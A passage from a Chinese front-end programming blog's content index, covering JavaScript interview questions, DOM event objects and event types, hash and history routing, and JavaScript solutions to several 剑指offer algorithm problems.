(!topics.hasOwnProperty(topic)) &#123; topics[topic] = []; &#125; topics[topic].push(handler); &#125;, // 发布事件，触发观察者回调事件 publish: function (topic, info) &#123; if (topics.hasOwnProperty(topic)) &#123; topics[topic].forEach(function (handler) &#123; handler(info); &#125;) &#125; &#125;, // 移除主题的一个观察者的回调事件 remove: function (topic, handler) &#123; if (!topics.hasOwnProperty(topic)) return; var handlerIndex = -1; topics[topic].forEach(function (item, index) &#123; if (item === handler) &#123; handlerIndex = index; &#125; &#125;) if (handlerIndex &gt;= 0) &#123; topics[topic].splice(handlerIndex, 1); &#125; &#125;, // 移除主题的所有观察者的回调事件 removeAll: function (topic) &#123; if (topics.hasOwnProperty(topic)) &#123; topics[topic] = []; &#125; &#125; &#125;&#125;)(); 详细资料可以参考： 《JS 事件模型》 163. EventEmitter 实现 1234567891011121314151617181920212223242526272829303132333435363738394041class EventEmitter &#123;constructor() &#123; this.events = &#123;&#125;;&#125;on(event, callback) &#123; let callbacks = this.events[event] || []; callbacks.push(callback); this.events[event] = callbacks; return this;&#125;off(event, callback) &#123; let callbacks = this.events[event]; this.events[event] = callbacks &amp;&amp; callbacks.filter(fn =&gt; fn !== callback); return this;&#125;emit(event, ...args) &#123; let callbacks = this.events[event]; callbacks.forEach(fn =&gt; &#123; fn(...args); &#125;); return this;&#125;once(event, callback) &#123; let wrapFun = function (...args) &#123; callback(...args); this.off(event, wrapFun); &#125;; this.on(event, wrapFun); return this;&#125;&#125; 164. 一道常被人轻视的前端JS面试题 1234567891011121314151617function Foo() &#123; getName = function () &#123; alert (1); &#125;; return this;&#125;Foo.getName = function () &#123; alert (2);&#125;;Foo.prototype.getName = function () &#123; alert (3);&#125;;var getName = function () &#123; alert (4);&#125;;function getName() &#123; alert (5);&#125;//请写出以下输出结果：Foo.getName(); // 2getName(); // 4Foo().getName(); // 1getName(); // 1new Foo.getName(); // 2new Foo().getName(); // 3new new Foo().getName(); // 3 详细资料可以参考： 《前端程序员经常忽视的一个 JavaScript 面试题》 《一道考察运算符优先级的 JavaScript 面试题》 《一道常被人轻视的前端 JS 面试题》 165. 如何确定页面的可用性时间，什么是 Performance API？ Performance API 用于精确度量、控制、增强浏览器的性能表现。这个 API 为测量网站性能，提供以前没有办法做到的精度。 getTime的缺点 使用 getTime 来计算脚本耗时的缺点，首先，getTime方法（以及 Date 对象的其他方法）都只能精确到毫秒级别（一秒的千分之一），想要得到更小的时间差别就无能为力了。其次，这种写法只能获取代码运行过程中的时间进度，无法知道一些后台事件的时间进度，比如浏览器用了多少时间从服务器加载网页。 为了解决这两个不足之处，ECMAScript 5引入“高精度时间戳”这个 API，部署在 performance 对象上。它的精度可以达到1毫秒的千分之一（1秒的百万分之一）。 navigationStart：当前浏览器窗口的前一个网页关闭，发生 unload 事件时的 Unix 毫秒时间戳。如果没有前一个网页，则等于fetchStart 属性。 loadEventEnd：返回当前网页 load 事件的回调函数运行结束时的 Unix 毫秒时间戳。如果该事件还没有发生，返回 0。 12345678910111213141516171819202122232425function getPerformanceTiming() &#123; var t = performance.timing var times = &#123;&#125; // 页面加载完成的时间，用户等待页面可用的时间 times.loadPage = t.loadEventEnd - t.navigationStart // 解析 DOM 树结构的时间 times.domReady = t.domComplete - t.responseEnd // 重定向的时间 times.redirect = t.redirectEnd - t.redirectStart // DNS 查询时间 times.lookupDomain = t.domainLookupEnd - t.domainLookupStart // 读取页面第一个字节的时间 times.ttfb = t.responseStart - t.navigationStart // 资源请求加载完成的时间 times.request = t.responseEnd - t.requestStart // 执行 onload 回调函数的时间 times.loadEvent = t.loadEventEnd - t.loadEventStart // DNS 缓存时间 times.appcache = t.domainLookupStart - t.fetchStart // 卸载页面的时间 times.unloadEvent = t.unloadEventEnd - t.unloadEventStart // TCP 建立连接完成握手的时间 times.connect = t.connectEnd - t.connectStart return times&#125; 166. js 中的命名规则 （1）第一个字符必须是字母、下划线（_）或美元符号（$）（2）余下的字符可以是下划线、美元符号或任何字母或数字字符 一般我们推荐使用驼峰法来对变量名进行命名，因为这样可以与 ECMAScript 内置的函数和对象命名格式保持一致。 167. js 语句末尾分号是否可以省略？ 在 ECMAScript 规范中，语句结尾的分号并不是必需的。但是我们一般最好不要省略分号，因为加上分号一方面有利于我们代码的可维护性，另一方面也可以避免我们在对代码进行压缩时出现错误。 168. Object.assign() Object.assign() 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。 169. Math.ceil 和 Math.floor Math.ceil() === 向上取整，函数返回一个大于或等于给定数字的最小整数。 Math.floor() === 向下取整，函数返回一个小于或等于给定数字的最大整数。 170. js for 循环注意点 当判断语句含有多个语句时，以最后一个判断语句的值为准，因此上面的代码会执行 10 次。当判断语句为空时，循环会一直进行。123for (var i = 0, j = 0; i &lt; 5, j &lt; 9; i++, j++) &#123; console.log(i, j);&#125; 171. 一个列表，假设有100000个数据，这个该怎么办？ （1）将数据分页，利用分页的原理，每次服务器端只返回一定数目的数据，浏览器每次只对一部分进行加载。 （2）使用懒加载的方法，每次加载一部分数据，其余数据当需要使用时再去加载。 （3）使用数组分块技术，基本思路是为要处理的项目创建一个队列，然后设置定时器每过一段时间取出一部分数据，然后再使用定时器取出下一个要处理的项目进行处理，接着再设置另一个定时器。 172. js 中倒计时的纠偏实现？ 在前端实现中我们一般通过 setTimeout 和 setInterval 方法来实现一个倒计时效果。但是使用这些方法会存在时间偏差的问题，这是由于 js 的程序执行机制造成的，setTimeout 和 setInterval 的作用是隔一段时间将回调事件加入到事件队列中，因此事件并不是立即执行的，它会等到当前执行栈为空的时候再取出事件执行，因此事件等待执行的时间就是造成误差的原因。 一般解决倒计时中的误差的有这样两种办法： （1）第一种是通过前端定时向服务器发送请求获取最新的时间差，以此来校准倒计时时间。 （2）第二种方法是前端根据偏差时间来自动调整间隔时间的方式来实现的。这一种方式首先是以 setTimeout 递归的方式来实现倒计时，然后通过一个变量来记录已经倒计时的秒数。每一次函数调用的时候，首先将变量加一，然后根据这个变量和每次的间隔时间，我们就可以计算出此时无偏差时应该显示的时间。然后将当前的真实时间与这个时间相减，这样我们就可以得到时间的偏差大小，因此我们在设置下一个定时器的间隔大小的时候，我们就从间隔时间中减去这个偏差大小，以此来实现由于程序执行所造成的时间误差的纠正。 173. 进程间通信的方式？ （1）管道通信（2）消息队列通信（3）信号量通信（4）信号通信（5）共享内存通信（6）套接字通信 174. 如何查找一篇英文文章中出现频率最高的单词？1234567891011121314151617181920212223function findMostWord(article) &#123; // 合法性判断 if (!article) return; // 参数处理 article = article.trim().toLowerCase(); let wordList = article.match(/[a-z]+/g), visited = [], maxNum = 0, maxWord = \"\"; article = \" \" + wordList.join(\" \") + \" \"; // 遍历判断单词出现次数 wordList.forEach(function (item) &#123; if (visited.indexOf(item) &lt; 0) &#123; let word = new RegExp(\" \" + item + \" \", \"g\"), num = article.match(word).length; if (num &gt; maxNum) &#123; maxNum = num; maxWord = item; &#125; &#125; &#125;); return maxWord + \" \" + maxNum;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"面经笔经","slug":"技术/前端/面经笔经","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/%E9%9D%A2%E7%BB%8F%E7%AC%94%E7%BB%8F/"}],"tags":[]},{"title":"事件对象与事件类型","slug":"事件对象与事件类型","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.712Z","comments":true,"path":"2020/03/15/事件对象与事件类型/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1%E4%B8%8E%E4%BA%8B%E4%BB%B6%E7%B1%BB%E5%9E%8B/","excerpt":"DOM中的事件对象","text":"DOM中的事件对象 在DOM级事件处理程序中，无论使用的是哪一级的DOM事件处理程序，都会将一个event对象传入到事件处理程序当中。 对于所有事件，一般都会有下列成员 属性/方法 类型 说明 bubbles Boolean 表明事件是否可以冒泡 cancelable Boolean 是否可以取消事件的默认行为 currentTarget Element 事件处理程序当前正在到达并处理事件的那个元素 defaultPrevented Boolean 为true表示已经调用preventDefault()——DOM3级事件新增 detail Integer 与事件相关的细节部分 eventPhase Integer 调用事件处理程序的阶段 1：捕获 2：处于目标3：冒泡 preventDefault() Function 取消事件的默认行为 stopImmediatePropagation() Function 取消事件进一步冒泡，同时阻止事件处理程序被调用 stopPropagation() Function 取消事件的进一步冒泡 target Element 事件的目标 type String 事件的类型 在事件处理程序内部，对象this始终等于currentTarget的值。注意区分target和currentTarget：如果事件处理程序在目标元素上，那么这两个值相等。但是如果事件处理程序在目标元素的父节点上，那么这两个值就是不相等的 1234let btn = document.getElementById('mybtn')btn.onclick = function(event)&#123; event.currentTarget === event.target //true&#125; 123456let b = document.bodyb.onclick = function(event)&#123; event.currentTarget === event.target //false currentTarget //body target //mybtn&#125; 阻止浏览器默认行为W3C的方法是e.preventDefault()，IE则是使用e.returnValue = false preventDefault是事件对象Event的一个方法，作用是取消一个目标元素的默认行为。如果元素没有默认行为，调用无效。什么元素有默认行为呢？如链接点我，提交按钮等 return false:JS的return false只会阻止默认行为，而jQuery则既阻止默认行为又防止对象冒泡阻止浏览器默认行为兼容： 123456789function stopDefault(e) &#123; var e = e || window.event; if (e &amp;&amp; e.preventDefault)&#123; e.preventDefault(); &#125;else&#123; e.returnValue = false; &#125; return false;&#125; 注意：只有cancelable属性设置为true时才能过使用preventDefault取消其默认行为 阻止事件冒泡W3C的方法是e.stopPropagation()，IE则是使用e.cancelBubble = true stopPropagation是事件对象Event的一个方法，作用是阻止目标元素的冒泡事件，但是不会阻止默认行为 注意，由于IE不支持事件捕获，因此e.cancelBubble = true只能停止事件冒泡，但是e.stopPropagation()可以同时取消事件捕获和事件冒泡 阻止事件冒泡兼容: 12345678function stopPropagation(e) &#123; var e = e || window.event; if ( e &amp;&amp; e.stopPropagation )&#123; e.stopPropagation(); &#125;else&#123; e.cancelBubble = true; &#125;&#125; 事件类型UI事件UI事件指的是不一定与用户操作有关的事件 load：页面完全加载后在window上触发，当所有框架加载完毕后再框架集上触发，当图像加载完毕后在img元素上触发。 unload：当页面完全卸载后在window上触发，当所有框架都卸载后在框架集上触发。 resize：当窗口或框架大小变化在window或框架上面触发 scroll：当用户滚动带滚动条的元素时在该元素上面触发 焦点事件 blur：元素失去焦点时触发，不可以冒泡 focus：元素获得焦点时触发，不可以冒泡 focusin：元素获得焦点触发，可以冒泡 focusout：元素失去焦点时触发，可以冒泡 注意：虽然blur和focus不冒泡，但是可以在事件捕获阶段侦听到他们。 当焦点从一个元素移动到另一个元素时，会依次触发下面这些事件 focusout focusin blur focus 鼠标事件 鼠标事件 描述 click 按下鼠标时触发 dblclick 双击鼠标时触发 mousedown 按下鼠标键时触发 mouseup 释放按下鼠标键触发 mousemove 鼠标在节点内部移动触发，持续移动，事件会持续触发（会有性能问题） mouseenter 鼠标首次进入节点触发，进入子节点不会触发。（在节点内只会触发一次） mouseover 鼠标进入节点触发，进入子节点会再一次触发 mouseout 鼠标离开节点触发，离开父节点也会触发 mouseleave 鼠标离开节点触发，离开父节点不会触发 contextmenu 鼠标右键(右键菜单)前触发，或按下右键菜单时触发 wheel| 滚动鼠标的滚轮时触发，继承WheelEvent接口| mouseover 和 mouseenter 的共同点：鼠标进入一个节点触发 区别： mouseover 会在子节点触发多次 mouseenter 只触发一次 mouseout 和 mouseleave 共同点： 鼠标离开一个节点时触发 区别： 在父元素内部离开一个子元素时，mouseout事件会触发。在父元素内部离开一个子元素时，mouseout事件不会触发。 鼠标事件的位置 客户区坐标位置鼠标事件是在浏览器的窗口特定位置上发生的，这个位置信息保存在事件对象的clientX和clientY。 页面坐标位置这个位置信心告诉你鼠标事件是在页面中什么位置发生的，保存在pageX和pageY中 PageX和clientX ,这个两个比较容易搞混, PageX:鼠标在页面上的位置,从页面左上角开始,即是以页面为参考点,不随滑动条移动而变化，换句话说，从滚动页面的左上角开始计算 clientX:鼠标在页面上可视区域的位置,从浏览器可视区域左上角开始,即是以浏览器滑动条此刻的滑动到的位置为参考点,随滑动条移动 而变化. 移动端设备由于没有鼠标，所以移动端的鼠标事件有一定区别与变化 不支持dbclick事件，双击浏览器窗口会放大画面，而且没有办法改变这个事件 点击可单机元素会触发mouseover事件，如果这个事件不会导致屏幕发生变化，那么会依次发生mousedown、mouseup、click事件。否则不再有其他事件发生 mousemove事件也会触发mouseover和mouseout事件 触摸事件 touchstart：手指触摸屏幕时触发 touchmove：手指在屏幕上滑动时连续触发。在这个事件发生期间调用preventDefault()可以阻止滚动 touchend：手指从屏幕移开时触发 touchcancel：系统停止跟踪触摸事件时触发 html5事件contextmenu事件调出上下文菜单触发的事件，简单来说就是在windows下点击鼠标右键，在mac下Ctrl+单击。有时候我们需要给网页设置自定义的上下文菜单，于是contextmenu事件出现了。 由于这个事件是冒泡的，所以可以为document指定一个事件处理程序，用来代理页面中发生的所有此类事件。搭配preventDefault使用可以取消默认的上下文菜单，从而自定义上下文菜单。然后通过clientX和clientY来设置自定义菜单显示的位置，设置visible来控制自定义菜单的显示与隐藏。 beforeunload事件在页面卸载前触发事件，让开发者在页面被卸载前阻止操作，但是需要注意的是，这个事件旨在页面卸载前提醒用户，询问用户是否离开页面，不能完全阻止页面被卸载。 DOMcontentloaded事件 当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，而无需等待样式表、图像和子框架的完成加载。 load 仅用于检测一个完全加载的页面，页面的html、css、js、图片等资源都已经加载完之后才会触发 load 事件。 hashchange事件HTML5新增的hashchange事件，以便在URL参数列表发生变化时通知开发者 前端路由的hash实现 www.test.com/#/ 就是 Hash URL，当 # 后面的哈希值发生变化时，可以通过 hashchange 事件来监听到 URL的变化，从而进行跳转页面，并且无论哈希值如何变化，服务端接收到的 URL 请求永远是 www.test.com 123window.addEventListener('hashchange', () =&gt; &#123; // ... 具体逻辑&#125;) Hash 模式相对来说更简单，并且兼容性也更好 前端路由的history实现History 模式是 HTML5 新推出的功能，主要使用 history.pushState 和 history.replaceState 改变 URL 通过 History 模式改变 URL 同样不会引起页面的刷新，只会更新浏览器的历史记录。 1234// 新增历史记录history.pushState(stateObject, title, URL)// 替换当前历史记录history.replaceState(stateObject, title, URL) 当用户做出浏览器动作时，比如点击后退按钮时会触发 popState 事件 1234window.addEventListener('popstate', e =&gt; &#123; // e.state 就是 pushState(stateObject) 中的 stateObject console.log(e.state)&#125;) 两种模式对比 Hash模式只可以更改 # 后面的内容，History 模式可以通过 API 设置任意的同源 URL History 模式可以通过 API 添加任意类型的数据到历史记录中，Hash 模式只能更改哈希值，也就是字符串 Hash 模式无需后端配置，并且兼容性好。History 模式在用户手动输入地址或者刷新页面的时候会发起 URL 请求，后端需要配置 index.html 页面用于匹配不到静态资源（就像nginx配置react路由） 关于冒泡不支持冒泡的事件 UI事件 load unload scroll resize 焦点事件 blur focus 鼠标事件 mouseleave mouseenter","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"剑指offer面试题10-斐波那契数列","slug":"剑指offer面试题10-斐波那契数列","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.410Z","comments":true,"path":"2020/03/15/剑指offer面试题10-斐波那契数列/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9810-%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97/","excerpt":"剑指offer面试题10：斐波那契数列","text":"剑指offer面试题10：斐波那契数列 这道题作为大多数教科书上面讲解递归的经典场景，并不意味着递归是这道题的最优解法，这道题用递归很容易写出这个代码 代码如下： 123456789function Fibonacci(n)&#123; // write code here if(n &lt;= 0) return 0 if(n === 1) return 1 else&#123; return Fibonacci(n - 1) + Fibonacci(n - 2) &#125;&#125; 然后提交：不出所料，TLE了我们仔细想一下，随便举个例子，求f(10)，我们需要经过这些步骤：很容易看出问题，在这棵树中有很多节点是重复的，而且重复节点数会随着n的增大而急剧增大，事实上，用递归方法计算这道题，时间复杂度会呈指数型增长 所以这道题最好的解法，就是老老实实顺着解: 12345678910111213function Fibonacci(n)&#123; // write code here let a = [] a[0] = 0 a[1] = 1 let k = 2 while(k &lt;= n)&#123; a[k] = a[k - 1] + a[k - 2] k++ &#125; return a[n]&#125; 这种做法只需要顺序遍历一边就可以解出答案，时间复杂度为：O(n) 当然，还有一种直接是O(1)的方法：通项公式。这个方法了解就好，一般不会有记住通项公式的要求","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题11-旋转数组的最小值","slug":"剑指offer面试题11-旋转数组的最小值","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.264Z","comments":true,"path":"2020/03/15/剑指offer面试题11-旋转数组的最小值/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9811-%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E5%80%BC/","excerpt":"剑指offer面试题11：旋转数组的最小值","text":"剑指offer面试题11：旋转数组的最小值 题目： 把一个数组最开始的若干个元素搬到数组的末尾， 我们称之数组的旋转。输入一个递增排序的数组的一个旋转， 输出旋转数组的最小元素。例如数组{3，4, 5, 1, 2 ｝为｛ l1,2,3, 4，5}的一个旋转，该数组的最小值为1 通过分析这个旋转数组的特性我们可以发现，旋转后的数组实际上可以分为两组子数组，前者的所有元素均大于后者的所有元素。我们还可以注意到，我们要求的最小元素刚好就是这两组子数组的分界线。所以这道题就是求这两个子数组之间的分界线。排序数组我们就可以用二分法的思想进行搜索，时间复杂度可以降为O(logn) 具体的步骤和二分法查找大体相同，用两个指针分别指向数组的第一个元素和最后一个元素，然后查看两个指针正中间的元素，如果正中间这个元素大于第一个指针的元素，那么就将第一个指针移到中间；否则如果正中间元素小于最后一个指针的元素，则将最后一个指针移到正中间，以此往复循环，直到两个指针相邻，那么第二个指针就是最小的元素。 这道题需要考虑两个特殊情况，一个是这个旋转数组就是原数组：[1,2,3,4,5]，这个时候用上述方法就会发现中间的元素既大于指针1元素又小于指针2元素，所以出现了bug，这种情况直接返回数组第一项就行。第二种情况是两个指针指向的元素大小相同，这个时候中间的元素要么同时大于两个指针元素，要么同时小于两个指针元素，也出现了bug，这种情况只能按顺序来搜索，时间复杂度也免不了成为O(n)， 代码如下： 123456789101112131415161718192021222324252627function minNumberInRotateArray(p)&#123; // write code here if(p.length === 0) return 0 if(p[0] &lt; p[p.length - 1]) return p[0] else if(p[0] === p[p.length - 1])&#123; let min = Number.MAX_VALUE for(let i = 0; i &lt; p.length; i++)&#123; if(p[i] &lt; min) min = p[i] &#125; return min &#125; else&#123; let index1 = 0 let index2 = p.length - 1 let indexMid while(p[index1] &gt;= p[index2])&#123; if(index2 - index1 === 1) return p[index2] indexMid = Math.round(((index1 + index2) / 2)) if(p[indexMid] &gt;= p[index1])&#123; index1 = indexMid &#125; else if(p[index2] &gt;= p[indexMid])&#123; index2 = indexMid &#125; &#125; &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题12-矩阵中的路径","slug":"剑指offer面试题12-矩阵中的路径","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.410Z","comments":true,"path":"2020/03/15/剑指offer面试题12-矩阵中的路径/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9812-%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/","excerpt":"剑指offer面试题12：矩阵中的路径","text":"剑指offer面试题12：矩阵中的路径 请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右，向上，向下移动一个格子。如果一条路径经过了矩阵中的某一个格子，则该路径不能再进入该格子。 例如 矩阵中包含一条字符串”bcced”的路径，但是矩阵中不包含”abcb”路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入该格子。 思路：这道题使用的是回溯法解决问题。由于题目没有要求从哪个点作为起点，所以所有的点都要试一下，直到找到路径的起点值。 这道题的回溯思想就是，当遍历到一个点，就分别搜索这个点的上下左右点是否可以满足条件，如果满足条件，那么就把这个点标记为“已路过”，并继续搜索；否则释放标记。 回溯可以说天生就是和递归相配合的，对于这道题，依然适用递归的方法；我们还是来寻找递归终点。这道题的递归终点就在，遍历到的这个点在路径上的位置，不仅恰好等于字符串的这个位置的值，并且这个位置是字符串的最后一个位置，那么这个时候就说明找到了路径，返回true 其他时候，对于遍历到的点，首先判断边界条件，例如这个点是否被访问过、是否超出了原数组的边界，或者路径长度直接大于了原数组长度。这些情况一律返回false 然后比较当前遍历到的这个点的值，记录他的位置index，然后在字符串中查看index这个位置的字符和这个点的值是不是相等，如果不相等也是直接返回false，并且将visit数组中对应的值释放（能够正常回溯） 如果这个值相等，那么就是两种情况，要么到达遍历终点，要么继续搜索。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839function hasPath(matrix, rows, cols, path)&#123; // write code here let a = false if(matrix === null || rows &lt; 1 || cols &lt; 1 || !path) return false let visit = new Array(rows) for(let i = 0; i &lt; rows; i++)&#123; visit[i] = new Array(cols) &#125; let pathlength = 0 for(let i = 0; i &lt; rows; i++)&#123; for(let j = 0; j &lt; cols; j++)&#123; a = a || findhasPath(matrix, i, j, rows, cols, visit, path, pathlength) &#125; &#125; return a&#125;function findhasPath(matrix, i, j, rows, cols, visit, path, pathlength)&#123; let index = i * cols + j let has if(matrix[index] !== path[pathlength] || i &lt; 0 || j &lt; 0 || i &gt; rows - 1 || j &gt; cols - 1 || visit[i][j] === 1 || path.length &gt; matrix.length) return false else&#123; let pathLength = pathlength + 1 visit[i][j] = 1 if(pathLength === path.length) return true else&#123; has = findhasPath(matrix, i, j + 1, rows, cols, visit, path, pathLength) || findhasPath(matrix, i + 1, j, rows, cols, visit, path, pathLength) || findhasPath(matrix, i - 1, j, rows, cols, visit, path, pathLength) || findhasPath(matrix, i, j - 1, rows, cols, visit, path, pathLength) if(has)&#123; return true &#125; else&#123; visit[i][j] = 0 return false &#125; &#125; &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题13-机器人的运动范围","slug":"剑指offer面试题13-机器人的运动范围","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.265Z","comments":true,"path":"2020/03/15/剑指offer面试题13-机器人的运动范围/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9813-%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4/","excerpt":"剑指offer面试题13：矩阵中的路径","text":"剑指offer面试题13：矩阵中的路径 地上有一个m行和n列的方格。一个机器人从坐标0,0的格子开始移动，每一次只能向左，右，上，下四个方向移动一格，但是不能进入行坐标和列坐标的数位之和大于k的格子。 例如，当k为18时，机器人能够进入方格（35,37），因为3+5+3+7 = 18。但是，它不能进入方格（35,38），因为3+5+3+8 = 19。请问该机器人能够达到多少个格子？ 思路：这道题使用的回溯思想，和上一个题基本类似 当遍历到一个点，就分别搜索这个点的上下左右点是否可以满足条件，如果满足条件，那么就把这个点标记为“已路过”，并继续搜索；否则释放标记。 对于遍历到的点，依然是首先判断条件，例如这个点是否被访问过、是否超出了原数组的边界，或者是否满足题目要求的不能进入行坐标和列坐标的数位之和大于k的格子。如果不满足这些情况一律返回0 否则就将这个点在visit中标记，然后在递归访问他的相邻节点 代码如下： 12345678910111213141516171819202122232425262728function movingCount(threshold, rows, cols)&#123; // write code here let visit = new Array(rows) for(let i = 0; i &lt; rows; i++)&#123; visit[i] = new Array(cols) &#125; return calCount(threshold, rows, cols, visit, 0, 0)&#125;function calCount(threshold, rows, cols, visit, i, j)&#123; let rowsS = i.toString() let colsS = j.toString() let num = 0 for(let i = 0; i &lt; rowsS.length; i++)&#123; num += parseInt(rowsS[i]) &#125; for(let i = 0; i &lt; colsS.length; i++)&#123; num += parseInt(colsS[i]) &#125; if(num &gt; threshold || i &lt; 0 || j &lt; 0 || i &gt;= rows || j &gt;= cols || visit[i][j] === 1 ) return 0 else&#123; visit[i][j] = 1 let count = 1 + calCount(threshold, rows, cols, visit, i, j + 1) + calCount(threshold, rows, cols, visit, i + 1, j) + calCount(threshold, rows, cols, visit, i - 1, j) + calCount(threshold, rows, cols, visit, i, j - 1) return count &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题14-剪绳子","slug":"剑指offer面试题14-剪绳子","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.410Z","comments":true,"path":"2020/03/15/剑指offer面试题14-剪绳子/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9814-%E5%89%AA%E7%BB%B3%E5%AD%90/","excerpt":"剑指offer面试题14：剪绳子","text":"剑指offer面试题14：剪绳子 给你一根长度为n的绳子，请把绳子剪成整数长的m段（m、n都是整数，n&gt;1并且m&gt;1），每段绳子的长度记为k[0],k[1],…,k[m]。请问k[0]xk[1]x…xk[m]可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。 思路：这道题可以使用动态规划和贪心算法，前者时间复杂度和空间复杂度是O(n^2),O(n)而后者均是O(1) 先来说一说动态规划，动态规划的概念就是将一个大问题分解为若干子问题来解决，对于这道题，也是可以用这种思想。 对于长度为n的绳子，我们可以把它剪成i和n-i的两段，我们要向得到问题最优解f(n)， 就需要对这两段绳子继续划分，这个时候f(n)的最优解就依赖于f(i)和f(n-i)，也就是一个整体的问题被分解成为了依赖与各个子问题的最优解。 对于这题的动态规划，我们依然使用递归的方案进行，值得注意的是，在每一步我们剪了一刀之后，有四种选择：直接计算，左边绳子继续剪，右边绳子继续剪，两边都继续剪。四种选择的最大值才是当前这种减法的最大值。 首先我们可以确定，当绳子长度为1, 2，3时，分别的最优解为0,1,2。其他长度都是基于此计算的 我们以一个实际例子来探讨：长度为4的绳子，我们有两种剪法：（1，3）、（2，2），我们定义一个数组[0， 